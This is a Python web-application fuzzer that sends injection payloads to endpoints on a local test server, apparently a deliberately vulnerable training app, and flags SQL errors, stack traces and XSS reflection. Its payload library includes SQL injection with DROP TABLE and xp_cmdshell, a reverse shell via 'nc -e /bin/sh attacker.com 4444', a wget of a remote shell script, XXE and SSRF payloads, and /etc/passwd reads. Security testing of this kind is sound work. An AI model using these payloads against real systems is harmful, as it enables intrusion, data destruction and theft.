#!/usr/bin/env python3
"""
NOVA INTELLIGENT FUZZER v1.0
Parameter-aware fuzzing engine that learns response patterns.
Mutation-based with success pattern recognition.
"""

import json
import random
import re
import string
import time
import requests
from datetime import datetime
from typing import Dict, List, Optional
from urllib.parse import urljoin, quote


class NovaFuzzer:
    """
    Intelligent parameter fuzzer.
    - Generates context-aware payloads
    - Mutates based on response patterns
    - Learns successful anomaly triggers
    - Detects error messages, stack traces, debug info
    """

    def __init__(self, base_url: str = "http://localhost:3000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "Nova/3.0 (Fuzzer)"})
        self.results = []
        self.anomaly_patterns = {
            "sql_error": [
                r"SQL syntax", r"mysql_fetch", r"ORA-\d+", r"PostgreSQL",
                r"sqlite", r"SQLITE_", r"unclosed quotation", r"near \"",
                r"UNION.*SELECT", r"column.*not found",
            ],
            "stack_trace": [
                r"Traceback", r"stack trace", r"at \w+\.\w+:\d+",
                r"Error:.*\n.*at ", r"File \".*\", line \d+",
            ],
            "debug_info": [
                r"debug", r"dump", r"var_dump", r"print_r",
                r"console\.log", r"DEBUG:", r"\[object Object\]",
            ],
            "path_disclosure": [
                r"/var/www", r"/home/", r"C:\\", r"/opt/",
                r"\/data\/", r"\/usr\/", r"internal path",
            ],
            "xss_reflection": [
                r"<script>.*</script>", r"onerror=", r"onload=",
                r"javascript:", r"<img.*src=x", r"<svg.*onload",
            ],
            "open_redirect": [
                r"Location:.*https?://", r"redirect.*https?://",
                r"url=.*https?://", r"next=.*https?://",
            ],
            "server_error": [
                r"500.*Internal", r"503.*Service",
                r"502.*Bad Gateway", r"unhandled.*error",
            ],
            "auth_bypass_indicator": [
                r"admin.*panel", r"dashboard", r"role.*admin",
                r"isAdmin.*true", r"privilege.*elevated",
            ],
        }

        self.payload_library = self._build_payload_library()

    def _build_payload_library(self) -> Dict[str, List[str]]:
        """Build a comprehensive mutation payload library."""
        return {
            "sql_injection": [
                "'", "\"", "`", "' OR '1'='1", "\" OR \"1\"=\"1",
                "' OR 1=1--", "'; DROP TABLE users--",
                "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
                "1' AND '1'='1", "1' AND '1'='2",
                "' WAITFOR DELAY '0:0:5'--", "' AND 1=CONVERT(int, @@version)--",
                "1' ORDER BY 1--", "1' ORDER BY 100--",
                "admin'--", "' OR 1=1 LIMIT 1--",
                "') OR ('1'='1", "%27+OR+1%3D1",
                "||'1'='1", "'; EXEC xp_cmdshell('dir')--",
            ],
            "xss": [
                "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>", "javascript:alert(1)",
                "<body onload=alert(1)>", "<iframe src=javascript:alert(1)>",
                "\"><script>alert(1)</script>", "'><script>alert(1)</script>",
                "<scr<script>ipt>alert(1)</scr</script>ipt>",
                "%3Cscript%3Ealert(1)%3C/script%3E",
                "<img src=x onerror=prompt(1)>",
                "><img src=x onerror=alert(1)>",
            ],
            "path_traversal": [
                "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
                "....//....//....//etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd",
                "/etc/passwd", "C:\\Windows\\System32\\drivers\\etc\\hosts",
                "....//....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            ],
            "command_injection": [
                "; ls", "| ls", "`ls`", "$(ls)", "\nls",
                "; id", "| id", "`id`", "$(id)",
                "; cat /etc/passwd", "| cat /etc/passwd",
                "& dir", "&& dir", "|| dir",
                "; wget http://attacker.com/shell.sh",
                "| nc -e /bin/sh attacker.com 4444",
            ],
            "xxe": [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]>',
            ],
            "ssrf": [
                "http://localhost:3000/admin", "http://127.0.0.1:3000/api",
                "http://0.0.0.0:3000", "file:///etc/passwd",
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/",
                "gopher://127.0.0.1:6379/_INFO",
            ],
            "null_byte": [
                "%00", "\x00", "%2500", "\\0",
                "test.php%00.jpg", "test.php\\0.jpg",
            ],
            "http_parameter_pollution": [
                "param=value1&param=value2",
                "param[]=value1&param[]=value2",
                "param=value1%26param=value2",
            ],
            "type_juggling": [
                "true", "false", "null", "0", "1", "[]", "{}",
                '{"key":"value"}', "[1,2,3]",
                "0e12345", "0e67890",
            ],
        }

    # ---------- ANOMALY DETECTION ----------
    def detect_anomalies(self, response) -> Dict:
        """Analyze response for security-relevant anomalies."""
        detected = {
            "status_code": response.status_code,
            "response_length": len(response.text),
            "response_time": response.elapsed.total_seconds(),
            "anomalies": [],
            "severity": "none",
        }

        for category, patterns in self.anomaly_patterns.items():
            for pattern in patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    detected["anomalies"].append({
                        "category": category,
                        "pattern": pattern,
                    })
                    break

        # Severity rating
        anomaly_categories = [a["category"] for a in detected["anomalies"]]
        if "sql_error" in anomaly_categories or "command_injection" in anomaly_categories:
            detected["severity"] = "critical"
        elif "stack_trace" in anomaly_categories or "path_disclosure" in anomaly_categories:
            detected["severity"] = "high"
        elif "xss_reflection" in anomaly_categories or "open_redirect" in anomaly_categories:
            detected["severity"] = "medium"
        elif anomaly_categories:
            detected["severity"] = "low"

        return detected

    # ---------- PARAMETER MUTATION ----------
    def mutate_payload(self, base_payload: str, mutation_type: str = "random") -> str:
        """Apply mutations to base payloads."""
        mutations = {
            "url_encode": lambda p: quote(p),
            "double_url_encode": lambda p: quote(quote(p)),
            "unicode_encode": lambda p: p.encode('unicode_escape').decode(),
            "case_flip": lambda p: p.swapcase(),
            "double": lambda p: p + p,
            "reverse": lambda p: p[::-1],
            "null_prefix": lambda p: "\x00" + p,
            "null_suffix": lambda p: p + "\x00",
            "space_to_tab": lambda p: p.replace(" ", "\t"),
            "newline_inject": lambda p: p.replace(" ", "\n"),
            "comment_wrap": lambda p: f"/*{p}*/",
            "html_entity": lambda p: p.replace("'", "&#39;").replace('"', "&#34;"),
        }

        if mutation_type == "random":
            mutation_type = random.choice(list(mutations.keys()))

        mutator = mutations.get(mutation_type, lambda p: p)
        return mutator(base_payload)

    # ---------- INTELLIGENT FUZZING ----------
    def fuzz_endpoint(
        self,
        endpoint: str,
        method: str = "GET",
        params: List[str] = None,
        data_params: List[str] = None,
        fuzz_types: List[str] = None,
        intensity: str = "medium",
    ) -> List[Dict]:
        """
        Fuzz a single endpoint with intelligent payload selection.
        """
        if params is None:
            params = ["q"]
        if fuzz_types is None:
            fuzz_types = ["sql_injection", "xss", "path_traversal"]

        results = []
        total_payloads = 0

        # Determine payload count based on intensity
        intensity_map = {"low": 3, "medium": 8, "high": 15, "extreme": "all"}
        count = intensity_map.get(intensity, 8)

        print(f"\n  🎲 Fuzzing: {method} {endpoint}")
        print(f"     Parameters: {params}")
        print(f"     Categories: {fuzz_types} | Intensity: {intensity}")

        for fuzz_type in fuzz_types:
            payloads = self.payload_library.get(fuzz_type, [])
            if count != "all":
                payloads = random.sample(payloads, min(count, len(payloads)))

            for base_payload in payloads:
                # Test base payload
                total_payloads += 1
                result = self._send_fuzz_request(endpoint, method, params, base_payload)
                anomaly = self.detect_anomalies(result["response"])
                result.update(anomaly)
                results.append(result)

                if anomaly["anomalies"]:
                    print(f"     🔴 [{anomaly['severity'].upper()}] {base_payload[:50]}... → {', '.join(a['category'] for a in anomaly['anomalies'])}")

                # Test 2 mutations
                for _ in range(2):
                    mutated = self.mutate_payload(base_payload)
                    total_payloads += 1
                    result = self._send_fuzz_request(endpoint, method, params, mutated)
                    anomaly = self.detect_anomalies(result["response"])
                    result.update(anomaly)
                    results.append(result)

                time.sleep(0.05)  # Rate limit

        # Sort by severity
        results.sort(key=lambda r: {"critical": 4, "high": 3, "medium": 2, "low": 1, "none": 0}.get(r.get("severity", "none"), 0), reverse=True)

        print(f"     ✅ Done: {total_payloads} payloads, {len([r for r in results if r['anomalies']])} anomalies")
        return results

    def _send_fuzz_request(self, endpoint: str, method: str, params: List[str], payload: str) -> Dict:
        """Send a single fuzz request."""
        result = {
            "endpoint": endpoint,
            "method": method,
            "payload": payload,
            "timestamp": datetime.now().isoformat(),
            "response": None,
        }

        url = f"{self.base_url}{endpoint}"
        param_dict = {p: payload for p in params}

        try:
            start = time.time()
            if method.upper() == "GET":
                resp = self.session.get(url, params=param_dict, timeout=10)
            elif method.upper() == "POST":
                resp = self.session.post(url, data=param_dict, timeout=10)
            else:
                resp = self.session.request(method, url, data=param_dict, timeout=10)

            result["response"] = type("Response", (), {
                "status_code": resp.status_code,
                "text": resp.text,
                "elapsed": type("Elapsed", (), {"total_seconds": lambda: time.time() - start})(),
            })()
        except Exception as e:
            result["response"] = type("Response", (), {
                "status_code": 0,
                "text": str(e),
                "elapsed": type("Elapsed", (), {"total_seconds": lambda: 0})(),
            })()

        return result

    # ---------- BATCH FUZZING ----------
    def fuzz_targets(self, targets: List[Dict], intensity: str = "medium") -> Dict:
        """Fuzz multiple targets and aggregate results."""
        print("""
╔══════════════════════════════════════╗
║   NOVA INTELLIGENT FUZZER v1.0     ║
║   Mutation-Based Attack Surface    ║
╚══════════════════════════════════════╝
        """)

        all_results = []
        for target in targets:
            results = self.fuzz_endpoint(
                endpoint=target["endpoint"],
                method=target.get("method", "GET"),
                params=target.get("params", ["q"]),
                fuzz_types=target.get("fuzz_types", ["sql_injection", "xss"]),
                intensity=target.get("intensity", intensity),
            )
            all_results.extend(results)

        # Aggregate
        critical = [r for r in all_results if r.get("severity") == "critical"]
        high = [r for r in all_results if r.get("severity") == "high"]
        medium = [r for r in all_results if r.get("severity") == "medium"]

        report = {
            "timestamp": datetime.now().isoformat(),
            "total_payloads": len(all_results),
            "anomalies_found": len([r for r in all_results if r["anomalies"]]),
            "critical": len(critical),
            "high": len(high),
            "medium": len(medium),
            "top_findings": (critical + high + medium)[:10],
        }

        with open("nova_fuzzer_report.json", "w") as f:
            json.dump(report, f, indent=2, default=str)

        print(f"""
╔══════════════════════════════════════╗
║        FUZZING COMPLETE             ║
╠══════════════════════════════════════╣
║  Payloads Sent:    {report['total_payloads']:>4}             ║
║  Anomalies Found:  {report['anomalies_found']:>4}             ║
║  Critical:         {report['critical']:>4}             ║
║  High:             {report['high']:>4}             ║
║  Medium:           {report['medium']:>4}             ║
╚══════════════════════════════════════╝
        """)

        return report


if __name__ == "__main__":
    fuzzer = NovaFuzzer()

    targets = [
        {"endpoint": "/rest/products/search", "method": "GET", "params": ["q"], "fuzz_types": ["sql_injection", "xss", "path_traversal"]},
        {"endpoint": "/rest/user/login", "method": "POST", "params": ["email", "password"], "fuzz_types": ["sql_injection", "type_juggling"]},
        {"endpoint": "/api/Feedbacks", "method": "POST", "params": ["comment", "rating"], "fuzz_types": ["xss", "sql_injection", "command_injection"]},
        {"endpoint": "/file-serving", "method": "GET", "params": ["file"], "fuzz_types": ["path_traversal", "null_byte", "ssrf"]},
    ]

    report = fuzzer.fuzz_targets(targets, intensity="medium")
